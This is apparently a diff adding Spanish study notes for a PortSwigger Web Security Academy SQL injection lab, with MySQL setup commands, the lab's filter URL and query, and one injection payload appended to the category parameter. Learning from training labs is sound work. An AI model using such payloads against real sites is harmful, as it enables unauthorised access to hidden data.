@@ -1,0 +1,12 @@
+create database port_swigger; => Creamos la base de datos
+use port_swigger; => Usamos la base de datos
+create table products (id int auto_increment primary key, category varchar(32),released int); => Creamos una tabla productos
+show tables; => Vemos las tablas creadas
+describe products; => Describimos la tabla productos
+insert into products (category,released) values ("Corporate gifts",1); => Insertar productos
+select * from products; => Seleccionar productos
+
+
+https://0a4300960321338c81c2acd200320021.web-security-academy.net/filter?category=Corporate+gifts
+SELECT * FROM products WHERE category = 'Corporate gifts' AND released = 1; => Esta es la consulta que se realiza en la url de la página
+filter?category=Corporate+gifts' or released=0 --; => Se agrega una comilla simple adicional después de la categoría y el comentario debe ir antes del ;
